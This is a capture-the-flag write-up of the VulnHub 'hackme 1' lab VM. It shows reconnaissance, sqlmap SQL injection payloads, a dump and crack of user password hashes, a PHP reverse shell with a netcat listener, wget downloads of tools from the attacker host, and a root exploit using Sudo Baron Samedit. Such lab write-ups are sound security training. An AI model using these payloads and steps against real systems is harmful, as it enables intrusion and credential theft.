# OSCP Prep - *hackme 1*

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/hackme-1,330/) and set it up with VMware Workstation 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -Pn -v -T4 192.168.57.138
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 13:49 EDT
Initiating ARP Ping Scan at 13:49
Scanning 192.168.57.138 [1 port]
Completed ARP Ping Scan at 13:49, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:49
Completed Parallel DNS resolution of 1 host. at 13:49, 0.02s elapsed
Initiating SYN Stealth Scan at 13:49
Scanning 192.168.57.138 [1000 ports]
Discovered open port 80/tcp on 192.168.57.138
Discovered open port 22/tcp on 192.168.57.138
Completed SYN Stealth Scan at 13:49, 0.05s elapsed (1000 total ports)
Nmap scan report for 192.168.57.138
Host is up (0.000079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:BD:A9:FF (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)
```

Looks like a simple website, so I visit it and am redirected to a ```login.php``` page.

The first thing I see is a login page with the option to create an account.

After creating an account and logging in, I'm presented with a pretty horrible looking bookstore and the ability to search for things.

From the looks of it, it's very obvious that there's SQL involved, so I start performing SQLi.

## Step 2 - Exploitation

Using Burp Suite, I capture the following POST request made to the bookstore and save an offline copy of it.

```
POST /welcome.php HTTP/1.1
Host: 192.168.57.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.57.138
Connection: close
Referer: http://192.168.57.138/welcome.php
Cookie: PHPSESSID=f5truacndojsv5e8o3pr106dlp
Upgrade-Insecure-Requests: 1

search=test
```

Now that I have an offline copy of the request, I don't need to worry about constantly being redirected back to the login page to be able to make any queries.

Using SQLmap, I start basic SQL injection to see if I can avoid going the "manual labor" route.

```
$ sudo sqlmap -r hackme --risk=3 --level=5 -p search
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.6#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:52:20 /2022-07-13/
...
```

Immediately, SQLmap recognizes that the database uses MySQL and starts using MySQL-specific injection queries.

```
...
[13:52:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:52:21] [INFO] POST parameter 'search' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="12")
[13:52:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
[13:52:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
...
```

Finally, a couple of SQL injection queries are found and can successfully be used.

```
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 133 HTTP(s) requests:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: search=-9991' OR 2731=2731-- Evaa

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 6383 FROM (SELECT(SLEEP(5)))kKcK)-- FLLT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7171707671,0x704352416e51766274657378426e6a586756416a536e447262767363674f764c4656697156716367,0x7170787671)-- -
---
[13:52:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.10 (cosmic)
web application technology: Apache 2.4.34
back-end DBMS: MySQL >= 5.0.12
[13:52:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.57.138'

[*] ending @ 13:52:35 /2022-07-13/
```

We can now start exfiltrating data.

Through various queries, I finally retrieve a list of usernames and MD5-hashed passwords that I can easily crack and obtain.

```
$ sudo sqlmap -r hackme -D webapphacking -T users -C user,pasword --dump
...

[13:53:35] [INFO] fetching entries of column(s) '`user`,pasword' for table 'users' in database 'webapphacking'
[13:53:35] [INFO] recognized possible password hashes in column 'pasword'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[13:53:37] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[13:53:37] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[13:53:39] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:53:39] [INFO] starting 16 processes 
[13:53:40] [INFO] cracked password 'commando' for hash '6269c4f71a55b24bad0f0267d9be5508'
[13:53:41] [INFO] cracked password 'hello' for hash '5d41402abc4b2a76b9719d911017c592'
[13:53:42] [INFO] cracked password 'p@ssw0rd' for hash '0f359740bd1cda994f8b55330c86d845'
[13:53:43] [INFO] cracked password 'testtest' for hash '05a671c66aefea124cc08b76ea6d30bb'
Database: webapphacking
Table: users
[7 entries]
+------------+---------------------------------------------+
| user       | pasword                                     |
+------------+---------------------------------------------+
| user1      | 5d41402abc4b2a76b9719d911017c592 (hello)    |
| user2      | 6269c4f71a55b24bad0f0267d9be5508 (commando) |
| user3      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |
| test       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| superadmin | 2386acb2cf356944177746fc92523983            |
| test1      | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| meowmycks  | 282e0ac5b5b2822b50a2edf2384b309b            |
+------------+---------------------------------------------+

[13:53:44] [INFO] table 'webapphacking.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.57.138/dump/webapphacking/users.csv'
[13:53:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.57.138'

[*] ending @ 13:53:44 /2022-07-13/
```

The password for ```superadmin``` wasn't cracked using SQLmap's default wordlist, but throwing the hash into Crackstation revealed the password to simply be ```Uncrackable```. Smart.

![image](https://user-images.githubusercontent.com/45502375/179264143-a05445ab-53bf-425f-81c5-77efb7577615.png)

Logging out of my own account and logging in with the credentials ```superadmin:Uncrackable``` reveals a file uploading page called ```welcomeadmin.php```.

The very first thing I try is directly uploading a PHP reverse shell script, which surprisingly works. It even tells me that it's in the uploads folder.

So I start up a Netcat listener on port 4444...

```
$ sudo nc -lvnp 4444    
listening on [any] 4444 ...
```

...and request my script at ```http://192.168.57.138/uploads/catshell.php```...

```
GET /uploads/catshell.php HTTP/1.1
Host: 192.168.57.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=f5truacndojsv5e8o3pr106dlp
Upgrade-Insecure-Requests: 1
```

...and I receive a connection from the target.

```
connect to [192.168.57.129] from (UNKNOWN) [192.168.57.138] 41742
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:55:09 up 7 min,  0 users,  load average: 0.00, 0.07, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Step 3 - Privilege Escalation

Now that I had a foothold in the server, I could focus on upgrading to root.

The first thing I did was upgrade to a TTY shell and start an HTTP server on my Kali box with Python using the command ```sudo python3 -m http.server 80```.

Doing this would allow me to download my scripts from the target machine using ```wget``` requests.

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@hackme:/$ ^Z
zsh: suspended  sudo nc -lvnp 4444
                                                                                                                                                                                                                                            
┌──(meowmycks㉿catBook)-[~]
└─$ stty raw -echo;fg 
[1]  + continued  sudo nc -lvnp 4444


www-data@hackme:/$ export TERM=xterm
```
```
$ sudo python3 -m http.server 80                    
[sudo] password for meowmycks: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I then attempted to download a local copy of Linux Smart Enumeration (LSE) onto the target machine.

```
www-data@hackme:/var/www$ wget http://192.168.57.129/lse.tar
```

However, I was denied permission to do so. 

```
--2022-07-13 17:55:52--  http://192.168.57.129/lse.tar
Connecting to 192.168.57.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24565760 (23M) [application/x-tar]
lse.tar: Permission denied

Cannot write to 'lse.tar' (Permission denied).
```

Figuring I didn't have write permissions in the user's home folder, which was really ```/var/www/``` since I was working under the web server's account, I went to the ```/tmp``` folder instead. Attempts to download files here were successful.

```
www-data@hackme:/var/www$ cd /tmp
cd /tmp
www-data@hackme:/tmp$ wget http://192.168.57.129/lse.tar
wget http://192.168.57.129/lse.tar
--2022-07-13 17:56:04--  http://192.168.57.129/lse.tar
Connecting to 192.168.57.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24565760 (23M) [application/x-tar]
Saving to: 'lse.tar'

lse.tar             100%[===================>]  23.43M  --.-KB/s    in 0.08s   

2022-07-13 17:56:04 (288 MB/s) - 'lse.tar' saved [24565760/24565760]
```

After decompressing and extracting the folder, I ran the enumeration script to reveal potential opportunities for privilege escalation.

Crucially, it found known vulnerabilities on the machine.

```
===================================================================( CVEs )=====                                                                                                                                                            
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
---
Vulnerable! sudo version: 1.8.23
---
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
---
Vulnerable!
---
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope

==================================( FINISHED )==================================
```

LSE revealed that the machine was vulnerable to the Sudo Baron Samedit exploit and the PwnKit exploit.

For situations like this, I went out of my way to package custom exploits that could take advantage of any found known vulnerabilities.

Therefore, all I had to do was find the right one to use. In this case, I chose to use the Sudo Baron Samedit exploit, since there were several different variations I could use in case one or multiple failed. It's also my favorite one purely because of the exploit's name.

```
www-data@hackme:/tmp/lse$ cd exploits   
cd exploits
www-data@hackme:/tmp/lse/exploits$ ls
ls
netfilter  polkit.tar  pwnkit  sudobaron.tar
www-data@hackme:/tmp/lse/exploits$ tar xf sudobaron.tar
tar xf sudobaron.tar
www-data@hackme:/tmp/lse/exploits$ cd sudobaron
cd sudobaron
www-data@hackme:/tmp/lse/exploits/sudobaron$ ls
ls
LICENSE                     exploit_nss.py         exploit_timestamp_race.c
README.md                   exploit_nss_d9.py      exploit_userspec.py
asm                         exploit_nss_manual.py  gdb
exploit_cent7_userspec.py   exploit_nss_u14.py
exploit_defaults_mailer.py  exploit_nss_u16.py
```

Fortunately after waiting for a few seconds, it worked on the first try with the ```exploit_nss.py``` script, allowing me to become root.

```
www-data@hackme:/tmp/lse/exploits/sudobaron$ python3 exploit_nss.py
python3 exploit_nss.py
# whoami
whoami
root
```

All I had to do now was get the flag...

...But there wasn't one, so I just made my own.

```
# echo "alright whatever gg i win"
alright whatever gg i win
```

## Conclusion

While this was certainly not the first web application CTF I've worked on, this was the first one where SQL injection was required to advance.

I don't normally work with SQLi or XSS, so it's nice to see it being used. Other times I've just used webapps like *DVWA* or *bWAPP* to get exposure, so to see it implemented in an (arguably) more real situation was cool.
